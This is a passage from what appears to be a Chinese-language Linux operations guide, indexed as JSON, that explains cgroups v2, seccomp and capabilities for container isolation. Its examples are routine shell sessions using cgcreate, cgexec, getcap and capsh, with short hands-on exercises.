\u200b\u5185\u6838\u200b\u63d0\u4f9b\u200b\u7684\u200b\u9650\u5236\u200b\u4e0e\u200b\u7edf\u8ba1\u200b\u8fdb\u7a0b\u200b\u8d44\u6e90\u200b\u4f7f\u7528\u200b\u7684\u200b\u673a\u5236\u200b\u3002 Cgroups \u200b\u4ee5\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5f62\u5f0f\u200b\u66b4\u9732\u200b\u7ed9\u200b\u7528\u6237\u200b\u6001\u200b\uff0c\u200b\u4e00\u822c\u200b\u6302\u8f7d\u200b\u5728\u200b <code>/sys/fs/cgroup/</code>\u3002 \u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u4f20\u7edf\u200b\u7684\u200b <code>setrlimit</code> \u200b\u7b49\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff0ccgroups \u200b\u80fd\u591f\u200b\u6709\u6548\u200b\u5730\u200b\u7ba1\u7406\u200b\u4e00\u7ec4\u200b\u8fdb\u7a0b\u200b\uff08\u200b\u4ee5\u53ca\u200b\u5b83\u4eec\u200b\u65b0\u5efa\u200b\u7684\u200b\u5b50\u200b\u8fdb\u7a0b\u200b\uff09\u200b\u7684\u200b\u8d44\u6e90\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u5728\u200b\u4f7f\u7528\u200b systemd \u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\uff0ccgroups \u200b\u7531\u200b systemd \u200b\u8d1f\u8d23\u7ba1\u7406\u200b\u3002 \u200b\u4ed4\u7ec6\u89c2\u5bdf\u200b <code>systemctl status</code> \u200b\u7684\u200b\u8f93\u51fa\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5176\u200b\u5c31\u200b\u5c55\u793a\u200b\u4e86\u200b\u4e00\u9897\u200b cgroup \u200b\u6811\u200b\uff08\u200b\u6ce8\u610f\u200b\u770b\u200b <code>init.scope</code> \u200b\u4e0a\u200b\u4e00\u884c\u200b\uff09\uff1a</p> <pre><code>$ systemctl status\n\u25cf example\n    State: running\n    Units: 271 loaded (incl. loaded aliases)\n     Jobs: 0 queued\n   Failed: 0 units\n    Since: Sun 2023-06-11 15:42:13 CST; 9 months 14 days ago\n  systemd: 252.19-1~deb12u1\n   CGroup: /\n           \u251c\u2500init.scope\n           \u2502 \u2514\u25001 /lib/systemd/systemd --system --deserialize=34\n           \u251c\u2500system.slice\n           \u2502 \u251c\u2500caddy.service\n           \u2502 \u2502 \u2514\u25002398446 /usr/bin/caddy run --environ --config /etc/caddy/Caddyfile\n           \u2502 \u251c\u2500containerd.service\n           \u2502 \u2502 \u2514\u25003923123 /usr/bin/containerd\n           \u2502 \u251c\u2500cron.service\n           \u2502 \u2502 \u2514\u2500649 /usr/sbin/cron -f\n           \u2502 \u251c\u2500dbus.service\n           \u2502 \u2502 \u2514\u2500650 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\n           \u2502 \u251c\u2500docker.service\n           \u2502 \u2502 \u2514\u25003926029 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock\n\uff08\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>systemd-cgtop</code> \u200b\u5b9e\u65f6\u200b\u67e5\u770b\u200b cgroup \u200b\u7684\u200b\u4f7f\u7528\u200b\u60c5\u51b5\u200b\u3002</p> <p>Cgroups \u200b\u6709\u200b v1 \u200b\u4e0e\u200b v2 \u200b\u4e24\u4e2a\u200b\u7248\u672c\u200b\u3002 \u200b\u8f83\u200b\u65b0\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u9ed8\u8ba4\u200b\u4ec5\u200b\u652f\u6301\u200b cgroups v2\uff0c\u200b\u7a0d\u200b\u8001\u200b\u4e00\u4e9b\u200b\u7684\u200b\u4f1a\u200b\u4f7f\u7528\u200b systemd \u200b\u7684\u200b \"unified_cgroup_hierarchy\" \u200b\u7279\u6027\u200b\uff0c\u200b\u5c06\u200b cgroups v1 \u200b\u4e0e\u200b v2 \u200b\u5408\u5e76\u200b\u66b4\u9732\u200b\u7ed9\u200b\u7528\u6237\u200b\u3002\u200b\u76ee\u524d\u200b\u5927\u90e8\u5206\u200b\u8f6f\u4ef6\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u652f\u6301\u200b cgroups v2\uff0c\u200b\u56e0\u6b64\u200b\u4e0b\u6587\u200b\u8ba8\u8bba\u200b cgroups \u200b\u65f6\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b v2\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u624b\u5de5\u200b\u901a\u8fc7\u200b\u8bfb\u5199\u200b\u6587\u4ef6\u200b\u63a7\u5236\u200b cgroups\uff1a</p> <pre><code>$ sleep 1d &amp;\n[1] 1910225\n$ sudo -i\n# cd /sys/fs/cgroup\n# mkdir test\n# cd test\n# echo 1910225 &gt; cgroup.procs\n# cat cgroup.procs\n1910225\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\uff0c\u200b\u6211\u4eec\u200b\u5c31\u200b\u5c06\u200b\u521a\u521a\u200b\u521b\u5efa\u200b\u7684\u200b <code>sleep 1d</code> \u200b\u7684\u200b\u8fdb\u7a0b\u200b\u79fb\u52a8\u200b\u5230\u200b\u4e86\u200b <code>test</code> cgroup \u200b\u4e2d\u200b\u3002 \uff08\u200b\u6ce8\u610f\u200b cgroup \u200b\u6811\u200b\u5305\u542b\u200b\u4e86\u200b\u7cfb\u7edf\u200b\u7684\u200b\u6240\u6709\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5199\u5165\u200b\u5230\u200b <code>cgroup.procs</code> \u200b\u7684\u200b\u5b9e\u9645\u200b\u8bed\u4e49\u200b\u662f\u200b\u79fb\u52a8\u200b\u8fdb\u7a0b\u200b\u6240\u5c5e\u200b\u7684\u200b cgroup\uff09\u3002</p> <p>\u200b\u7531\u4e8e\u200b <code>test</code> \u200b\u521b\u5efa\u200b\u5728\u200b\u6839\u200b\u4e0b\u9762\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5176\u200b\u5305\u542b\u200b\u4e86\u200b\u6240\u6709\u200b\u7684\u200b\u300c\u200b\u63a7\u5236\u5668\u200b\u300d\uff08Controller\uff09\u3002 \u200b\u4e0d\u540c\u200b\u7684\u200b\u63a7\u5236\u5668\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u7cfb\u7edf\u8d44\u6e90\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5185\u5b58\u200b\u3001CPU\u3001IO \u200b\u7b49\u200b\u3002 \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>ls</code> \u200b\u786e\u8ba4\u200b\uff1a</p> <pre><code># ls\ncgroup.controllers  cpu.max.burst            cpu.weight.nice       hugetlb.2MB.rsvd.max  memory.low       memory.zswap.current\ncgroup.events       cpu.pressure             hugetlb.1GB.current       io.bfq.weight     memory.max       memory.zswap.max\ncgroup.freeze       cpuset.cpus          hugetlb.1GB.events    io.latency        memory.min       misc.current\ncgroup.kill     cpuset.cpus.effective        hugetlb.1GB.events.local  io.low        memory.numa_stat     misc.events\ncgroup.max.depth    cpuset.cpus.exclusive        hugetlb.1GB.max       io.max        memory.oom.group     misc.max\ncgroup.max.descendants  cpuset.cpus.exclusive.effective  hugetlb.1GB.numa_stat     io.pressure       memory.peak          pids.current\ncgroup.pressure     cpuset.cpus.partition        hugetlb.1GB.rsvd.current  io.prio.class     memory.pressure      pids.events\ncgroup.procs        cpuset.mems          hugetlb.1GB.rsvd.max      io.stat       memory.reclaim       pids.max\ncgroup.stat     cpuset.mems.effective        hugetlb.2MB.current       io.weight         memory.stat          pids.peak\ncgroup.subtree_control  cpu.stat             hugetlb.2MB.events    irq.pressure      memory.swap.current  rdma.current\ncgroup.threads      cpu.stat.local           hugetlb.2MB.events.local  memory.current    memory.swap.events   rdma.max\ncgroup.type     cpu.uclamp.max           hugetlb.2MB.max       memory.events     memory.swap.high\ncpu.idle        cpu.uclamp.min           hugetlb.2MB.numa_stat     memory.events.local   memory.swap.max\ncpu.max         cpu.weight           hugetlb.2MB.rsvd.current  memory.high       memory.swap.peak\n</code></pre> <p>\u200b\u63a7\u5236\u5668\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>cgroup.subtree_control</code> \u200b\u63a7\u5236\u200b\u662f\u5426\u200b\u542f\u7528\u200b\u3002 \u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u6839\u636e\u200b cgroup v2 \u200b\u7684\u200b \"no internal processes\" \u200b\u89c4\u5219\u200b\uff0c \u200b\u9664\u6839\u200b\u8282\u70b9\u200b\u4ee5\u5916\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b cgroup \u200b\u4e0d\u80fd\u200b\u540c\u65f6\u200b\u672c\u8eab\u200b\u65e2\u200b\u5305\u542b\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u53c8\u200b\u8bbe\u7f6e\u200b\u4e86\u200b <code>subtree_control</code>\u3002</p> <p>\u200b\u5c1d\u8bd5\u200b\u64cd\u4f5c\u200b <code>subtree_control</code></p> <p>\u200b\u8bf7\u200b\u6839\u636e\u200b cgroups \u200b\u624b\u518c\u200b\u4ee5\u53ca\u200b\u4e0a\u6587\u200b\u7684\u200b\u8bf4\u660e\u200b\uff0c\u200b\u5728\u200b <code>test</code> cgroup \u200b\u4e0b\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b cgroup\uff0c\u200b\u5e76\u4e14\u200b\u4f7f\u200b\u5176\u4ec5\u200b\u5305\u542b\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u3002 \u200b\u60f3\u4e00\u60f3\u200b\uff1a\u200b\u4e0a\u9762\u200b\u7684\u200b <code>sleep</code> \u200b\u8fdb\u7a0b\u200b\u5e94\u8be5\u200b\u600e\u4e48\u200b\u64cd\u4f5c\u200b\uff1f</p> <p>\u200b\u5b9e\u9a8c\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u6740\u6389\u200b <code>sleep</code> \u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4f7f\u7528\u200b <code>rmdir</code> \u200b\u5220\u9664\u200b <code>test</code> cgroup\uff1a</p> <pre><code># cd /sys/fs/cgroup\n# kill 1910225\n# rmdir /sys/fs/cgroup/test\n</code></pre> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0d\u200b\u4f7f\u7528\u200b <code>rm -r</code></p> <p>\u200b\u601d\u8003\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff1a <code>/sys/fs/cgroup/test</code> \u200b\u5e76\u975e\u200b\u6211\u4eec\u200b\u4f20\u7edf\u610f\u4e49\u200b\u4e0a\u200b\u7684\u200b\u300c\u200b\u7a7a\u76ee\u5f55\u200b\u300d\uff0c\u200b\u4e3a\u4ec0\u4e48\u200b\u8fd9\u91cc\u200b\u8981\u200b\u7528\u200b <code>rmdir</code>\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u7528\u200b <code>rm -r</code> \u200b\u9012\u5f52\u200b\u5220\u9664\u200b\uff1f</p> <p>Cgroups \u200b\u6709\u200b\u547d\u4ee4\u884c\u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u7ba1\u7406\u200b\uff0c\u200b\u5b89\u88c5\u200b <code>cgroup-tools</code> \u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>cgcreate</code>\u3001<code>cgexec</code> \u200b\u7b49\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>$ sudo cgcreate -g memory:test  # \u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b test \u200b\u7684\u200b cgroup\n$ sudo cgset -r memory.max=16777216 test  # \u200b\u9650\u5236\u200b\u4f7f\u7528\u200b 16 MiB \u200b\u5185\u5b58\u200b\n$ sudo cgexec -g memory:test python3  # \u200b\u5728\u200b test \u200b\u4e0b\u200b\u8fd0\u884c\u200b python3\nPython 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; a = [0] * 4000000  # \u200b\u5c1d\u8bd5\u200b\u5360\u7528\u200b\u81f3\u5c11\u200b 32 MB \u200b\u5185\u5b58\u200b\nKilled\n$ sudo cgdelete memory:test  # \u200b\u6e05\u7406\u200b\u73b0\u573a\u200b\n</code></pre> <p>\u200b\u89c2\u5bdf\u200b\u8fd9\u4e9b\u200b\u547d\u4ee4\u200b\u7684\u200b\u884c\u4e3a\u200b</p> <p>\u200b\u8bf7\u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u5206\u6790\u200b\u5de5\u5177\u200b <code>strace</code> \u200b\u89c2\u5bdf\u200b <code>cgcreate</code>\u3001<code>cgset</code>\u3001<code>cgexec</code>\u3001<code>cgdelete</code> \u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u5177\u4f53\u200b\u7684\u200b\u63a7\u5236\u5668\u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\u8fd9\u91cc\u200b\u4e0d\u518d\u200b\u8d58\u8ff0\u200b\u3002</p>"},{"location":"ops/virtualization/container/#seccomp","title":"Seccomp","text":"<p>Seccomp \u200b\u662f\u200b Linux \u200b\u5185\u6838\u200b\u63d0\u4f9b\u200b\u7684\u200b\u9650\u5236\u200b\u8fdb\u7a0b\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u7684\u200b\u673a\u5236\u200b\u3002 \u200b\u5982\u679c\u200b\u6ca1\u6709\u200b seccomp\uff0c\u200b\u5373\u4f7f\u200b\u4f7f\u7528\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3001cgroups\uff0c\u200b\u5bb9\u5668\u200b\u5185\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b\u4efb\u610f\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff1a root \u200b\u6743\u9650\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u53ef\u4ee5\u200b\u968f\u610f\u200b\u8fdb\u884c\u200b\u8bf8\u5982\u200b\u5173\u673a\u200b\u3001\u200b\u64cd\u4f5c\u200b\u5185\u6838\u6a21\u5757\u200b\u7b49\u200b\u5371\u9669\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u8fd9\u200b\u901a\u5e38\u200b\u662f\u975e\u200b\u9884\u671f\u200b\u7684\u200b\uff1b \u200b\u5373\u4f7f\u200b\u901a\u8fc7\u200b\u7528\u6237\u200b\u673a\u5236\u200b\u9650\u5236\u200b\u4e86\u200b\u6743\u9650\u200b\uff0c\u200b\u66b4\u9732\u200b\u6240\u6709\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u4ecd\u7136\u200b\u5927\u5e45\u5ea6\u200b\u589e\u52a0\u200b\u4e86\u200b\u653b\u51fb\u9762\u200b\u3002</p> <p>\u200b\u4ece\u200b\u7a0b\u5e8f\u5458\u200b\u7684\u200b\u89d2\u5ea6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b libseccomp \u200b\u5e93\u200b\u7b80\u5316\u200b seccomp \u200b\u7684\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u6267\u884c\u200b Python 3 \u200b\u89e3\u91ca\u5668\u200b\u6700\u5c11\u200b\u9700\u8981\u200b\u591a\u5c11\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff1f</p> <p>\u200b\u4f7f\u7528\u200b libseccomp \u200b\u7f16\u5199\u7a0b\u5e8f\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u767d\u540d\u5355\u200b\u9650\u5236\u200b\u3002 \u200b\u5c1d\u8bd5\u200b\u627e\u51fa\u200b\u6700\u5c0f\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u96c6\u5408\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e86\u89e3\u200b\u5176\u4e2d\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u7684\u200b\u4f5c\u7528\u200b\u3002</p>"},{"location":"ops/virtualization/container/#capabilities","title":"Capabilities","text":"<p>\u200b\u4f20\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u7c7b\u200b Unix \u200b\u7cfb\u7edf\u200b\u90fd\u200b\u6839\u636e\u200b\u7528\u6237\u200b\u6765\u200b\u5224\u65ad\u200b\u6743\u9650\u200b\uff1aroot \u200b\u7528\u6237\u200b\u4ec0\u4e48\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u505a\u200b\uff0c\u200b\u975e\u200b root \u200b\u7528\u6237\u200b\u53ea\u80fd\u200b\u505a\u200b\u6709\u9650\u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u79cd\u200b\u6a21\u578b\u200b\u5728\u200b\u5982\u4eca\u200b\u5df2\u7ecf\u200b\u96be\u4ee5\u200b\u6ee1\u8db3\u200b\u590d\u6742\u200b\u7684\u200b\u9700\u6c42\u200b\uff1a\u200b\u4f8b\u5982\u200b <code>ping</code> \u200b\u7b49\u200b\u5de5\u5177\u200b\u5176\u5b9e\u200b\u53ea\u200b\u9700\u8981\u200b\u539f\u59cb\u200b\u5957\u200b\u63a5\u5b57\u200b\uff08raw socket\uff09\u200b\u7684\u200b\u6743\u9650\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5b8c\u6574\u200b\u7684\u200b root \u200b\u6743\u9650\u200b\u2014\u2014\u200b\u76f4\u63a5\u200b\u6dfb\u52a0\u200b SUID \u200b\u6743\u9650\u200b\u4f1a\u200b\u7559\u4e0b\u200b\u5f88\u5927\u200b\u7684\u200b\u653b\u51fb\u9762\u200b\uff1b\u200b\u800c\u200b\u5bb9\u5668\u200b\u73af\u5883\u200b\u4e2d\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e00\u822c\u200b\u4e5f\u200b\u4e0d\u200b\u5e0c\u671b\u200b root \u200b\u80fd\u200b\u505a\u200b\u6240\u6709\u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002\u200b\u5373\u4f7f\u200b\u6709\u200b seccomp \u200b\u9650\u5236\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff0c\u200b\u5728\u200b\u4e00\u90e8\u5206\u200b\u573a\u666f\u200b\u4e0b\u200b\u4e5f\u200b\u4e0d\u591f\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>ioctl</code> \u200b\u8fd9\u4e2a\u200b\u8c03\u7528\u200b\u662f\u200b\u901a\u7528\u200b\u7684\u200b\u2014\u2014\u200b\u5b83\u200b\u65e2\u200b\u53ef\u4ee5\u200b\u64cd\u4f5c\u200b\u7ec8\u7aef\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u64cd\u4f5c\u200b\u786c\u4ef6\u200b\u8bbe\u5907\u200b\u3002\u200b\u8981\u200b\u5728\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u5c42\u9762\u200b\u7ec6\u5316\u200b\u9650\u5236\u200b\u4e0d\u662f\u200b\u4ef6\u200b\u5bb9\u6613\u200b\u4e8b\u200b\u3002</p> <p>Linux \u200b\u5185\u6838\u200b\u7684\u200b\u80fd\u529b\u200b\uff08capabilities(7)\uff09\u200b\u5219\u200b\u628a\u200b root \u200b\u7684\u200b\u6743\u9650\u200b\u62c6\u200b\u5206\u6210\u200b\u4e86\u200b\u8bb8\u591a\u200b\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u80fd\u529b\u200b\u3002\u200b\u4f8b\u5982\u200b <code>ping</code> \u200b\u9700\u8981\u200b\u7684\u200b <code>CAP_NET_RAW</code> \u200b\u80fd\u529b\u200b\uff0c\u200b\u7ed5\u8fc7\u200b Unix \u200b\u4f20\u7edf\u200b\u6743\u9650\u200b\u63a7\u5236\u200b\u7684\u200b <code>CAP_DAC_OVERRIDE</code> \u200b\u80fd\u529b\u200b\u7b49\u200b\u3002\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u67d0\u4e2a\u200b\u80fd\u529b\u200b\uff0c\u200b\u8fdb\u7a0b\u200b\u5373\u4f7f\u200b\u662f\u200b root \u200b\u7528\u6237\u200b\uff0c\u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u6267\u884c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff1b\u200b\u53cd\u4e4b\u200b\u5373\u4f7f\u200b\u4e0d\u662f\u200b root\uff0c\u200b\u53ea\u8981\u200b\u6709\u200b\u5bf9\u5e94\u200b\u7684\u200b\u80fd\u529b\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002</p> <p>Capabilities \u200b\u53ef\u4ee5\u200b\u8d4b\u4e88\u200b\u7ed9\u200b\u8fdb\u7a0b\u200b\u548c\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b\u4e00\u90e8\u5206\u200b\u8f83\u200b\u65e7\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c<code>ping</code> \u200b\u547d\u4ee4\u200b\u7684\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u5c31\u200b\u88ab\u200b\u8d4b\u4e88\u200b\u4e86\u200b <code>CAP_NET_RAW</code> \u200b\u80fd\u529b\u200b\uff08<code>getcap</code> \u200b\u7b49\u200b capabilities \u200b\u76f8\u5173\u200b\u7684\u200b\u5de5\u5177\u200b\u5728\u200b <code>libcap2-bin</code> \u200b\u5305\u4e2d\u200b\uff09\uff1a</p> <pre><code>$ getcap /usr/bin/ping\n/usr/bin/ping cap_net_raw=ep\n</code></pre> Permitted\u3001Effective \u200b\u548c\u200b Inheritable \u200b\u96c6\u5408\u200b <p>\u200b\u4e0a\u9762\u200b\u8f93\u51fa\u200b\u4e2d\u200b\u7684\u200b <code>ep</code> \u200b\u4ee3\u8868\u200b\u8fd9\u4e2a\u200b\u7a0b\u5e8f\u200b\u7684\u200b <code>CAP_NET_RAW</code> \u200b\u80fd\u529b\u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u5230\u200b\u4e86\u200b Permitted \u200b\u548c\u200b Effective \u200b\u96c6\u5408\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u5bf9\u200b\u8fdb\u7a0b\u200b\uff08\u200b\u7ebf\u7a0b\u200b\uff09\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u7533\u8bf7\u200b\u4f7f\u7528\u200b\u5728\u200b Permitted \u200b\u96c6\u5408\u200b\u4e2d\u200b\u7684\u200b\u80fd\u529b\u200b\uff0c\u200b\u5728\u200b Effective \u200b\u96c6\u5408\u200b\u4e2d\u200b\u7684\u200b\u80fd\u529b\u200b\u5219\u200b\u662f\u200b\u5f53\u524d\u200b\u751f\u6548\u200b\u7684\u200b\u80fd\u529b\u200b\u3002\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b Inheritable \u200b\u96c6\u5408\u200b\uff0c\u200b\u4ee3\u8868\u200b\u53ef\u4ee5\u200b\u88ab\u5b50\u200b\u8fdb\u7a0b\u200b\u7ee7\u627f\u200b\u7684\u200b\u80fd\u529b\u200b\u3002\u200b\u800c\u200b\u5bf9\u200b\u6587\u4ef6\u200b\u6765\u8bf4\u200b\uff0c\u200b\u76f8\u5173\u200b\u7684\u200b\u96c6\u5408\u200b\u5b9a\u4e49\u200b\u6709\u200b\u4e00\u4e9b\u200b\u7ec6\u5fae\u200b\u7684\u200b\u5dee\u522b\u200b\uff0c\u200b\u8be6\u60c5\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u624b\u518c\u200b\u3002</p> \u200b\u4e3a\u4ec0\u4e48\u200b\u6211\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c<code>ping</code> \u200b\u65e2\u200b\u4e0d\u662f\u200b SUID \u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u4e5f\u200b\u6ca1\u6709\u200b capabilities\uff1f <p>Linux \u200b\u5185\u6838\u200b\u652f\u6301\u200b\u8bbe\u7f6e\u200b <code>net.ipv4.ping_group_range</code>\uff08\u200b\u8fd9\u4e2a\u200b\u9009\u9879\u200b\u4e5f\u200b\u63a7\u5236\u200b IPv6 \u200b\u4e0b\u200b\u5bf9\u5e94\u200b\u884c\u4e3a\u200b\uff09\uff0c\u200b\u6307\u5b9a\u200b\u54ea\u4e9b\u200b\u7528\u6237\u7ec4\u200b\u53ef\u4ee5\u200b\u5bf9\u5916\u200b\u53d1\u9001\u200b ICMP Echo\uff0c\u200b\u76f8\u6bd4\u200b capabilities \u200b\u66f4\u52a0\u200b\u7ec6\u5316\u200b\uff1a</p> <pre><code>$ sysctl net.ipv4.ping_group_range\nnet.ipv4.ping_group_range = 0   2147483647\n</code></pre> <p>\u200b\u5f53\u524d\u200b\u73af\u5883\u200b\u7684\u200b capabilities \u200b\u5219\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>capsh</code> \u200b\u67e5\u770b\u200b\uff08\u200b\u5176\u4e2d\u200b Bounding \u200b\u548c\u200b Ambient \u200b\u96c6\u5408\u200b\u7684\u200b\u8be6\u7ec6\u200b\u7ec6\u8282\u200b\u53ef\u200b\u53c2\u8003\u624b\u518c\u200b\uff09\uff1a</p> <pre><code>$ capsh --print\nCurrent: cap_wake_alarm=i\nBounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore\nAmbient set =\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n# capsh --print # \u200b\u662f\u200b\u6b63\u5e38\u200b\u7684\u200b root \u200b\u7528\u6237\u200b\u7684\u8bdd\u200b\u2026\u2026\nCurrent: =ep cap_wake_alarm+i\nBounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore\nAmbient set =\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>\u200b\u8bd5\u4e00\u4e0b\u200b\u9650\u5236\u200b capabilities</p> <p>\u200b\u4f7f\u7528\u200b <code>capsh</code> \u200b\u9650\u5236\u200b capabilities\uff0c\u200b\u5c1d\u8bd5\u200b\u8fd0\u884c\u200b\u4e00\u4e9b\u200b\u9700\u8981\u200b\u7279\u5b9a\u200b capabilities \u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5b89\u88c5\u200b/\u200b\u5378\u8f7d\u200b\u5185\u6838\u6a21\u5757\u200b\u3002</p> <p>\u200b\u5bb9\u5668\u200b\u5b9e\u73b0\u200b\u4e00\u822c\u200b\u4f1a\u200b\u9650\u5236\u200b\u6389\u200b\u5927\u90e8\u5206\u200b\u7684\u200b capabilities\uff08\u200b\u9664\u975e\u200b\u7528\u6237\u200b\u9700\u8981\u200b\u7279\u6743\u200b\u5bb9\u5668\u200b\uff09\u3002\u200b\u4f8b\u5982\u200b Docker \u200b\u53ef\u200b\u53c2\u8003\u200b\u5176\u200b\u9ed8\u8ba4\u200b\u5217\u8868\u200b\u3002</p> <p>\u200b\u8fdd\u80cc\u200b Capabilities \u200b\u8bbe\u8ba1\u200b\u521d\u8877\u200b\u7684\u200b <code>CAP_SYS_ADMIN</code></p> <p>\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6765\u8bf4\u200b\uff0cCapabilities 